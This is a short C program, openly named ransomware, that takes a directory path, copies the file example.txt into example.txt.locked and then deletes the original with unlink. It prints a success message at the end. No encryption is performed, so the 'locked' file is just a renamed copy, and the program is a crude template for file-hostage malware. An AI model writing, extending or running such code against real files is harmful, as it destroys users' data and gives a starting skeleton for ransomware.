#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#define PATH_MAX 4096

void ransomware(const char *dir_path) {
    // Construct full paths for the original and locked files
    char original_file[PATH_MAX];
    sprintf(original_file, "%s/example.txt", dir_path);

    char locked_file[PATH_MAX];
    sprintf(locked_file, "%s/example.txt.locked", dir_path);

    // Step 1: Open example.txt
    int original_fd = open(original_file, O_RDONLY);
    if (original_fd == -1) {
        perror("open");
        exit(EXIT_FAILURE);
    }

    // Step 2: Create example.txt.locked
    int locked_fd = open(locked_file, O_CREAT | O_WRONLY, S_IRUSR | S_IWUSR);
    if (locked_fd == -1) {
        perror("open");
        close(original_fd);
        exit(EXIT_FAILURE);
    }

    // Step 3: Store content of example.txt into example.txt.locked
    char buffer[BUFSIZ];
    ssize_t bytes_read;
    while ((bytes_read = read(original_fd, buffer, BUFSIZ)) > 0) {
        if (write(locked_fd, buffer, bytes_read) != bytes_read) {
            perror("write");
            close(original_fd);
            close(locked_fd);
            exit(EXIT_FAILURE);
        }
    }
    if (bytes_read == -1) {
        perror("read");
        close(original_fd);
        close(locked_fd);
        exit(EXIT_FAILURE);
    }

    // Step 4: Delete example.txt
    if (unlink(original_file) == -1) {
        perror("unlink");
        close(original_fd);
        close(locked_fd);
        exit(EXIT_FAILURE);
    }

    close(original_fd);
    close(locked_fd);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <directory_path>\n", argv[0]);
        return EXIT_FAILURE;
    }

    ransomware(argv[1]);
    printf("Ransomware executed successfully.\n");
    return EXIT_SUCCESS;
}
